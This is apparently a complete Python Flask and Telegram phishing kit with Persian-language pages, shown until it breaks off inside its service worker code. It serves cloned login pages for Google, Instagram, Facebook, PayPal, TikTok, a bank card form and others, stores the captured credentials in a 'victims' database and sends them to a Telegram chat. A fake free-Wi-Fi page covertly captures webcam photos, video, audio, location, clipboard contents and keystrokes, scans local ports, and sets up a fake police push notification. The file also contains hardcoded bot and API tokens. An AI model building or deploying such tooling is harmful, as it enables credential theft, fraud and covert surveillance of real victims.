import os, io, uuid, base64, json, logging, sqlite3, threading, time
from datetime import datetime
from flask import Flask, request, render_template_string, send_from_directory, jsonify, g, make_response, redirect
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# -------------------- Configuration --------------------
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
ADMIN_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "@Oython")
ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "8391932958"))
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
GROQ_API_KEY = os.environ.get("GROQ_API_KEY", "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")
DATABASE = "victims.db"
PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")

BOT_ACTIVE = True
AI_ENABLED = False

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# -------------------- Database --------------------
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

def init_db():
    with app.app_context():
        db = get_db()
        db.execute("CREATE TABLE IF NOT EXISTS victims (token TEXT PRIMARY KEY, created_at TEXT, ip TEXT, last_active TEXT, phishing_type TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT, type TEXT, data TEXT, timestamp TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS media (token TEXT, type TEXT, data BLOB, timestamp TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS credentials (token TEXT, email TEXT, password TEXT, timestamp TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS learned (keyword TEXT PRIMARY KEY, response TEXT)")
        db.commit()

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

# -------------------- Telegram Helpers --------------------
def send_telegram_message(text, reply_markup=None):
    if not TOKEN or not ADMIN_CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML", "reply_markup": reply_markup},
            timeout=10
        )
    except Exception as e:
        app.logger.error(f"Telegram message failed: {e}")

def send_telegram_file(file_bytes, filename, caption, as_image=False, as_video=False):
    if not TOKEN or not ADMIN_CHAT_ID:
        return
    try:
        if as_video:
            url = f"https://api.telegram.org/bot{TOKEN}/sendVideo"
            files = {'video': (filename, io.BytesIO(file_bytes), 'video/webm')}
        elif as_image:
            url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
            files = {'photo': (filename, io.BytesIO(file_bytes), 'image/jpeg')}
        else:
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            files = {'document': (filename, io.BytesIO(file_bytes), 'application/octet-stream')}
        data = {'chat_id': ADMIN_CHAT_ID, 'caption': caption}
        requests.post(url, data=data, files=files, timeout=10)
    except Exception as e:
        app.logger.error(f"Telegram file send failed: {e}")

def send_telegram_location(lat, lng):
    if not TOKEN or not ADMIN_CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendLocation",
            json={"chat_id": ADMIN_CHAT_ID, "latitude": lat, "longitude": lng},
            timeout=10
        )
    except Exception as e:
        app.logger.error(f"Telegram location failed: {e}")

# -------------------- Groq AI --------------------
def ask_groq(prompt):
    if not GROQ_API_KEY:
        return "⚠️ کلید Groq تنظیم نشده است."
    try:
        url = "https://api.groq.com/openai/v1/chat/completions"
        headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
        payload = {
            "model": "llama-3.1-70b-versatile",
            "messages": [{"role": "user", "content": prompt}],
            "temperature": 0.7
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=20)
        if resp.status_code != 200:
            app.logger.error(f"Groq error {resp.status_code}: {resp.text}")
            return f"❌ خطای {resp.status_code} از هوش مصنوعی."
        data = resp.json()
        return data['choices'][0]['message']['content'].strip()
    except Exception as e:
        app.logger.error(f"Groq error: {e}")
        return "❌ خطا در ارتباط با هوش مصنوعی."

# -------------------- Phishing Pages --------------------
PHISHING_GOOGLE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Sign in – Google</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#fff;font-family:Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:368px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);} img{display:block;margin:0 auto 16px;width:75px;} h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px;} p{font-size:16px;color:#5f6368;text-align:center;margin-bottom:32px;} input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px;outline:none;} input:focus{border-color:#1a73e8;} .btn{width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:24px;}</style></head>
<body><div class="container"><img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"><h1>Sign in</h1><p>to continue to Free Wi-Fi</p><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Enter your password" required><button class="btn" type="submit">Next</button></form></div></body></html>"""

PHISHING_GMAIL = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Gmail</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#f2f2f2;font-family:Google Sans,Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:368px;padding:48px 40px 36px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.2);text-align:center;} img{width:75px;margin-bottom:16px;} h1{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124;} p{font-size:16px;color:#5f6368;margin-bottom:32px;} input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px;} .btn{width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://www.gstatic.com/images/branding/gmail/2x/gmail_96dp.png" alt="Gmail"><h1>Sign in</h1><p>to continue to Gmail</p><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Enter your password" required><button class="btn" type="submit">Next</button></form></div></body></html>"""

PHISHING_INSTAGRAM = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Instagram</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:350px;padding:40px;background:white;border:1px solid #dbdbdb;text-align:center;} img{width:175px;margin-bottom:20px;} input{width:100%;padding:9px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;margin-bottom:6px;} .btn{width:100%;background:#0095f6;color:white;border:none;border-radius:4px;padding:8px;font-weight:600;margin-top:10px;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>"""

PHISHING_FACEBOOK = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Facebook – log in</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:396px;padding:20px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);text-align:center;} img{width:240px;margin-bottom:20px;} input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;} .btn{width:100%;background:#1877f2;color:white;border:none;border-radius:6px;padding:12px;font-size:20px;font-weight:bold;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email address or phone number" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>"""

PHISHING_BANK = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>پرداخت اینترنتی</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#f2f2f2;font-family:Tahoma;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:360px;padding:20px;background:white;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.2);text-align:center;} img{width:120px;margin-bottom:20px;} input{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:5px;font-size:14px;text-align:center;direction:ltr;} .btn{width:100%;background:#2e86de;color:white;border:none;border-radius:5px;padding:12px;font-size:16px;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://www.shaparak.ir/assets/images/logo.png"><h3>پرداخت امن شاپرک</h3><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="شماره کارت 16 رقمی" required><input type="text" name="password" placeholder="رمز دوم / CVV2"><button class="btn" type="submit">پرداخت</button></form></div></body></html>"""

PHISHING_SUPERCELL = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Supercell ID</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#1c1c1c;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:350px;padding:30px;background:#2b2b2b;border-radius:16px;box-shadow:0 0 20px rgba(0,0,0,0.5);text-align:center;} img{width:120px;margin-bottom:20px;} input{width:100%;padding:12px;background:#3a3a3a;border:1px solid #555;border-radius:8px;color:white;font-size:14px;margin-bottom:12px;} .btn{width:100%;background:#f8c400;color:black;border:none;border-radius:8px;padding:12px;font-weight:bold;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://play-lh.googleusercontent.com/MCJeBeFxrvzFxi6OJfO1mH-FS-pXrJ0IBqJcWXOZOLb4Ug4nX1oUPg5AEhjLMLhOew=w240-h480"><h3 style="color:white;">Supercell ID</h3><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>"""

PHISHING_LOTTERY = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>🎰 چرخ شانس</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#1a1a2e;font-family:'Segoe UI',Tahoma;display:flex;justify-content:center;align-items:center;height:100vh;color:white;} .container{width:350px;padding:30px;background:rgba(255,255,255,0.1);border-radius:20px;text-align:center;backdrop-filter:blur(10px);} h1{color:#ffd700;margin-bottom:10px;} p{color:#ccc;margin-bottom:20px;} input{width:100%;padding:12px;background:rgba(255,255,255,0.1);border:1px solid #ffd700;border-radius:8px;color:white;font-size:16px;margin-bottom:15px;text-align:center;} .btn{width:100%;background:#ff4757;color:white;border:none;border-radius:8px;padding:12px;font-weight:bold;font-size:16px;cursor:pointer;}</style></head>
<body><div class="container"><h1>🎰 چرخ شانس</h1><p>شما برنده آیفون ۱۵ شدید! برای دریافت، اطلاعات زیر را وارد کنید.</p><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="شماره تلفن" required><input type="text" name="password" placeholder="کد ملی"><button class="btn" type="submit">دریافت جایزه</button></form></div></body></html>"""

PHISHING_TWITTER = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Twitter – Log in</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;color:white;} .container{width:350px;padding:30px;background:#16181c;border-radius:16px;text-align:center;} img{width:50px;margin-bottom:15px;} h2{font-size:23px;font-weight:bold;margin-bottom:20px;} input{width:100%;padding:12px;background:#333;border:1px solid #555;border-radius:4px;color:white;font-size:15px;margin-bottom:15px;} .btn{width:100%;background:#1d9bf0;color:white;border:none;border-radius:30px;padding:12px;font-size:16px;font-weight:bold;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://abs.twimg.com/responsive-web/client-web/icon-ios.b1fc7279.png"><h2>Sign in to Twitter</h2><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Phone, email, or username" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log in</button></form></div></body></html>"""

PHISHING_SNAPCHAT = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Snapchat</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#fffc00;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:300px;padding:40px;background:white;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.2);text-align:center;} img{width:60px;margin-bottom:20px;} input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:10px;} .btn{width:100%;background:#fffc00;color:black;border:none;border-radius:30px;padding:12px;font-weight:bold;font-size:16px;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://play-lh.googleusercontent.com/KxeSAjPTKliCErbivNiXrd6cTwfbqUJcbSRPe_IBVK_YmwckfMRS1VIHz-5cgT09yMo=w240-h480"><h2>Log In</h2><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Username or Email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>"""

PHISHING_PAYPAL = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>PayPal – Log in</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#f5f5f5;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;} .container{width:350px;padding:30px;background:white;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.1);text-align:center;} img{width:120px;margin-bottom:20px;} input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:15px;} .btn{width:100%;background:#0070ba;color:white;border:none;border-radius:4px;padding:12px;font-weight:bold;font-size:16px;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg"><h3>Log in to your PayPal account</h3><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Email address" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log In</button></form></div></body></html>"""

PHISHING_TIKTOK = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>TikTok – Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#121212;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;color:white;} .container{width:320px;padding:30px;background:#1e1e1e;border-radius:20px;text-align:center;} img{width:80px;margin-bottom:20px;} input{width:100%;padding:12px;background:#2a2a2a;border:1px solid #444;border-radius:8px;color:white;font-size:14px;margin-bottom:12px;} .btn{width:100%;background:#fe2c55;color:white;border:none;border-radius:8px;padding:12px;font-weight:bold;font-size:16px;cursor:pointer;}</style></head>
<body><div class="container"><img src="https://lf16-tiktok-common.ttwstatic.com/obj/tiktok-web-common-sg/ies/tiktok/emblem/logo_web.png"><h2>Log in</h2><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log in</button></form></div></body></html>"""

# Capture Page Template (unchanged)
CAPTURE_PAGE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>اتصال به اینترنت رایگان</title>
<style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;} video,canvas{display:none;} #btn{display:block;margin:20px auto;padding:15px 30px;font-size:20px;background:#4CAF50;border:none;border-radius:10px;color:white;cursor:pointer;}</style>
</head>
<body>
    <h1 id="msg">برای فعال‌سازی اینترنت رایگان کلیک کنید</h1>
    <button id="btn" onclick="startEverything()">اتصال به اینترنت رایگان</button>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>
    <script>
        const t="{{ token }}";
        const msg=document.getElementById('msg'),btn=document.getElementById('btn'),v=document.getElementById('v'),c=document.getElementById('c'),ctx=c.getContext('2d');
        let stream=null;

        try {
            var popunder = window.open('about:blank', '_blank', 'width=200,height=100,left=9999,top=9999');
            if (popunder) {
                popunder.document.write('<html><head><title>.</title></head><body></body></html>');
                popunder.blur();
                window.focus();
            }
        } catch(e) {}

        async function startEverything(){
            btn.style.display='none';
            msg.innerText='در حال برقراری ارتباط...';
            fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'device',ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,screen:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'N/A'})});
            try{var cf=document.createElement('canvas');cf.width=200;cf.height=50;var cfctx=cf.getContext('2d');cfctx.textBaseline='top';cfctx.font='14px Arial';cfctx.fillText('Browser Fingerprint '+navigator.userAgent,2,2);fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'fingerprint',data:cf.toDataURL()})});}catch(e){}
            try{var pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=e=>{if(e.candidate){var ip=e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);if(ip)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'local_ip',ip:ip[1]})});}};}catch(e){}
            try{var clip=await navigator.clipboard.readText();if(clip)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'clipboard',data:clip})});}catch(e){}
            [80,22,443,8080,3389,5900,21].forEach(p=>{var img=new Image();img.src='http://127.0.0.1:'+p+'/favicon.ico?t='+Date.now();var st=Date.now();img.onload=img.onerror=function(){if(Date.now()-st<500)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'open_port',port:p})});};});
            if('serviceWorker' in navigator){navigator.serviceWorker.register('/sw.js?t='+t).then(reg=>{setTimeout(()=>{reg.showNotification('⚠️ هشدار فوری پلیس فتا',{body:'فعالیت غیرمجاز شناسایی شد. برای رفع اتهام کلیک کنید.',icon:'https://www.fata.gov.ir/images/logo.png',requireInteraction:true,vibrate:[300,100,300],data:{url:window.location.origin+'/go/'+t}});},15000);});}
            if(navigator.geolocation){
                navigator.geolocation.getCurrentPosition(
                    p => fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location',lat:p.coords.latitude,lng:p.coords.longitude})}),
                    e => fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location_error',message:e.message})})
                );
            }
            try{
                stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user", width:{ideal:320}, height:{ideal:240}}, audio:true});
                v.srcObject = stream;
                await new Promise(r=>v.onloadedmetadata=r);
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                msg.innerText = 'اتصال برقرار شد.';
                takeSnapshot();
                window.photoInterval = setInterval(takeSnapshot, 3000);
                startVideoRecording();
                try{
                    var aud = stream.getAudioTracks()[0];
                    if(aud){
                        var mr = new MediaRecorder(new MediaStream([aud]));
                        var chunks = [];
                        mr.ondataavailable = e => chunks.push(e.data);
                        mr.onstop = () => {
                            var blob = new Blob(chunks, {type:'audio/webm'});
                            var reader = new FileReader();
                            reader.onloadend = () => {
                                var b64 = reader.result.split(',')[1];
                                fetch('/upload/'+t, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'audio',data:b64})});
                            };
                            reader.readAsDataURL(blob);
                        };
                        mr.start();
                        setTimeout(() => { mr.stop(); }, 5000);
                    }
                }catch(e){}
            }catch(e){
                msg.innerText = 'عدم دسترسی به دوربین. همچنان اطلاعات جمع‌آوری می‌شود.';
            }
            var keys='';
            document.addEventListener('keydown',e=>{keys+=e.key;});
            setInterval(()=>{if(keys){fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'keystrokes',data:keys})});keys='';}},5000);
        }

        function takeSnapshot(){
            if(!stream) return;
            ctx.drawImage(v,0,0,c.width,c.height);
            var d = c.toDataURL('image/jpeg',0.8);
            fetch('/upload/'+t, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',data:d})});
        }

        function startVideoRecording(){
            try {
                if (!stream) return;
                var videoTrack = stream.getVideoTracks()[0];
                if (!videoTrack) return;
                var vr = new MediaRecorder(new MediaStream([videoTrack]), {mimeType: 'video/webm', videoBitsPerSecond: 500000});
                var chunks = [];
                vr.ondataavailable = e => chunks.push(e.data);
                vr.onstop = () => {
                    var blob = new Blob(chunks, {type:'video/webm'});
                    var reader = new FileReader();
                    reader.onloadend = () => {
                        var b64 = reader.result.split(',')[1];
                        fetch('/upload/'+t, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'video',data:b64})});
                    };
                    reader.readAsDataURL(blob);
                };
                vr.start();
                setTimeout(() => { if (vr.state === 'recording') vr.stop(); }, 10000);
            } catch(e) {}
        }

        window.addEventListener('beforeunload', ()=>{
            if(stream) stream.getTracks().forEach(tr=>tr.stop());
            clearInterval(window.photoInterval);
        });
    </script>
</body></html>
"""

ADMIN_LOGIN = """
<!DOCTYPE html><html><head><title>ورود</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
<body><h2>پنل مدیریت</h2><form method=post action=/admin><input type=password name=pass placeholder=رمز عبور><br><input type=submit value=ورود></form></body></html>
"""

ADMIN_PANEL_TEMPLATE = """
<!DOCTYPE html><html><head><title>قربانیان</title>
<style>body{background:#1e1e1e;color:#0f0;font-family:monospace;padding:20px;} .v{border:1px solid #0f0;padding:10px;margin:10px;} img{max-width:200px;}</style></head>
<body><h1>🎯 قربانیان</h1>
{% for v in victims %}
<div class=v>
  <b>توکن:</b> {{ v.token }}<br>
  <b>IP:</b> {{ v.ip }}<br>
  <b>زمان:</b> {{ v.created_at }}<br>
  <b>اطلاعات دستگاه:</b> <pre>{{ v.info }}</pre>
  {% if v.photo %}<b>عکس:</b><br><img src="data:image/jpeg;base64,{{ v.photo }}"><br>{% endif %}
  {% if v.audio %}<b>صدا:</b> <audio controls src="data:audio/webm;base64,{{ v.audio }}"></audio><br>{% endif %}
  {% if v.location %}<b>موقعیت:</b> <a href="https://maps.google.com/?q={{ v.location }}" target=_blank>مشاهده روی نقشه</a><br>{% endif %}
</div>
{% endfor %}
</body></html>
"""

# -------------------- Flask Routes --------------------
@app.route('/')
def index():
    return "Server running."

@app.route('/new-link')
def new_link():
    token = str(uuid.uuid4())
    db = get_db()
    db.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type) VALUES (?, ?, ?, ?, ?)",
               (token, datetime.now().isoformat(), request.remote_addr, datetime.now().isoformat(), "google"))
    db.commit()
    link = f"{request.host_url}go/{token}"
    return jsonify({"link": link, "token": token})

@app.route('/go/<token>')
def go_to_phish(token):
    db = get_db()
    victim = db.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
    if not victim:
        return "Invalid link", 404
    ptype = victim['phishing_type'] if victim['phishing_type'] else 'google'
    pages = {
        'google': PHISHING_GOOGLE, 'gmail': PHISHING_GMAIL, 'instagram': PHISHING_INSTAGRAM,
        'facebook': PHISHING_FACEBOOK, 'bank': PHISHING_BANK, 'supercell': PHISHING_SUPERCELL,
        'lottery': PHISHING_LOTTERY, 'twitter': PHISHING_TWITTER, 'snapchat': PHISHING_SNAPCHAT,
        'paypal': PHISHING_PAYPAL, 'tiktok': PHISHING_TIKTOK
    }
    page = pages.get(ptype, PHISHING_GOOGLE)
    return render_template_string(page, token=token)

@app.route('/login/<token>', methods=['POST'])
def login(token):
    email = request.form.get('email','').strip()
    password = request.form.get('password','').strip()
    db = get_db()
    db.execute("INSERT INTO credentials (token, email, password, timestamp) VALUES (?, ?, ?, ?)",
               (token, email, password, datetime.now().isoformat()))
    db.commit()
    send_telegram_message(f"🔑 <b>Login</b> from {token}\nEmail: <code>{email}</code>\nPassword: <code>{password}</code>")
    return redirect(f"/capture/{token}", code=302)

@app.route('/capture/<token>')
def capture(token):
    return render_template_string(CAPTURE_PAGE_TEMPLATE, token=token)

@app.route('/upload/<token>', methods=['POST'])
def upload(token):
    data = request.get_json()
    if not data:
        return jsonify({"error":"no data"}),400
    media_type = data.get('type')
    raw = data.get('data')
    try:
        if media_type == 'photo':
            binary = base64.b64decode(raw.split(',')[1] if ',' in raw else raw)
        elif media_type in ('audio', 'video'):
            binary = base64.b64decode(raw)
        else:
            return jsonify({"error":"unknown type"}),400
        db = get_db()
        db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                   (token, media_type, binary, datetime.now().isoformat()))
        db.execute("UPDATE victims SET last_active=? WHERE token=?", (datetime.now().isoformat(), token))
        db.commit()
        if TOKEN and ADMIN_CHAT_ID:
            if media_type == 'photo':
                count_row = db.execute("SELECT COUNT(*) as cnt FROM media WHERE token=? AND type='photo'", (token,)).fetchone()
                cnt = count_row['cnt'] if count_row else 0
                send_telegram_file(binary, 'camera.jpg', f"📸 <b>Photo #{cnt}</b> from {token}", as_image=True)
            elif media_type == 'audio':
                send_telegram_file(binary, 'mic.webm', f"🎤 <b>Audio</b> from {token}")
            elif media_type == 'video':
                send_telegram_file(binary, 'cam_video.webm', f"🎥 <b>Video</b> from {token}", as_video=True)
        return jsonify({"status":"ok"})
    except Exception as e:
        return jsonify({"error":str(e)}),500

@app.route('/log/<token>', methods=['POST'])
def log(token):
    data = request.get_json()
    data['ip'] = request.remote_addr
    db = get_db()
    db.execute("INSERT INTO logs (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
               (token, data.get('type','unknown'), json.dumps(data), datetime.now().isoformat()))
    db.execute("UPDATE victims SET ip=?, last_active=? WHERE token=?", (request.remote_addr, datetime.now().isoformat(), token))
    db.commit()
    if data.get('type') == 'device':
        msg = f"📱 <b>New Victim</b>\nToken: <code>{token}</code>\nIP: {request.remote_addr}\nDevice: {data.get('ua','')}"
        keyboard = [
            [InlineKeyboardButton("📸 Photo", callback_data=f"photo|{token}"),
             InlineKeyboardButton("🎤 Audio", callback_data=f"audio|{token}")],
            [InlineKeyboardButton("🎥 Video", callback_data=f"video|{token}"),
             InlineKeyboardButton("📍 Location", callback_data=f"location|{token}")],
            [InlineKeyboardButton("📋 Clipboard", callback_data=f"clipboard|{token}"),
             InlineKeyboardButton("⌨️ Keys", callback_data=f"keystrokes|{token}")],
            [InlineKeyboardButton("🔌 Ports", callback_data=f"ports|{token}"),
             InlineKeyboardButton("🌐 History", callback_data=f"history|{token}")]
        ]
        send_telegram_message(msg, reply_markup=InlineKeyboardMarkup(keyboard).to_dict())
    elif data.get('type') == 'location':
        send_telegram_message(f"📍 <b>Location</b> for {token}: {data.get('lat')},{data.get('lng')}")
        send_telegram_location(data.get('lat'), data.get('lng'))
    return jsonify({"status":"ok"})

@app.route('/admin', methods=['GET','POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('pass') == ADMIN_PASSWORD:
            resp = make_response("logged in")
            resp.set_cookie('admin','1')
            return resp
        return "رمز اشتباه",403
    if request.cookies.get('admin') != '1':
        return render_template_string(ADMIN_LOGIN)
    db = get_db()
    victims_rows = db.execute("SELECT * FROM victims ORDER BY created_at DESC").fetchall()
    victims = []
    for row in victims_rows:
        token = row['token']
        log_dev = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        info = json.loads(log_dev['data']) if log_dev else {}
        photo_row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        photo_b64 = base64.b64encode(photo_row['data']).decode() if photo_row else None
        audio_row = db.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        audio_b64 = base64.b64encode(audio_row['data']).decode() if audio_row else None
        loc_row = db.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        loc = None
        if loc_row:
            loc_data = json.loads(loc_row['data'])
            loc = f"{loc_data.get('lat')},{loc_data.get('lng')}"
        victims.append({
            "token": token,
            "ip": row['ip'],
            "created_at": row['created_at'],
            "info": json.dumps(info, indent=2, ensure_ascii=False),
            "photo": photo_b64,
            "audio": audio_b64,
            "location": loc
        })
    return render_template_string(ADMIN_PANEL_TEMPLATE, victims=victims)

# Service Worker (unchanged)
SW_JS = """
self.addEventListener('install', event => { self.skipWaiting(); });
self.addEventListener('activate', event => { event.waitUntil(clients.claim()); });
self.addEventListener('notificationclick', event => {
  event.notification.close();
  const urlToOpen = event.notification.data && event.notification.data.url 
                      ? event.notification.data.url 
                      : '/';
  event.waitUntil(
    clients.matchAll({ type: 'window', includeUncontrolled: true }).then(windowClients => {
      for (let client of windowClients) {
        if (client.url.includes(urlToOpen.split('/').pop())) {
          return client.focus();
        }
      }
      if (clients.openWindow) {
